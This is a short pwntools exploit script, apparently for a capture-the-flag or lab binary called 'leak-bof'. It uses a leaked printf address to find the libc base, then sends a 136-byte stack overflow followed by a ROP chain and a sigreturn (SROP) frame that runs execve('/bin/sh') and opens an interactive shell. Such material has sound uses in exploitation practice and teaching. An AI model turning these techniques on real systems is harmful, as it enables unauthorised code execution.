#!/usr/bin/env python3

from pwn import *
context.update(arch='amd64', os='linux')

elf = ELF("./leak-bof")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.33.so")
p = process("./leak-bof")
l = log.progress("Stage 1: leak printf and calculate libc's base address")

p.readuntil(b"I'm leaking printf: ")
libc.address = int(p.readline(), 16) - libc.sym['printf']
l.success(f"0x{libc.address:x}")
rop = ROP(libc.file.name)

l = log.progress("Stage 2: pop a shell with ROP + SROP payload")
bin_sh = next(libc.search(b'/bin/sh'))
syscall = libc.address + rop.syscall.address

rop.raw(libc.address + rop.find_gadget(['pop rax', 'ret']).address)
rop.raw(constants.SYS_rt_sigreturn)
rop.raw(syscall)

# build SROP frame
frame = SigreturnFrame(kernel="amd64", arch="amd64")
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rsp = bin_sh
frame.rip = syscall

# send stack smash and payload
p.sendlineafter(b": ", b"A"*136 + rop.chain() + bytes(frame))
l.success('Enjoy!')
p.interactive()

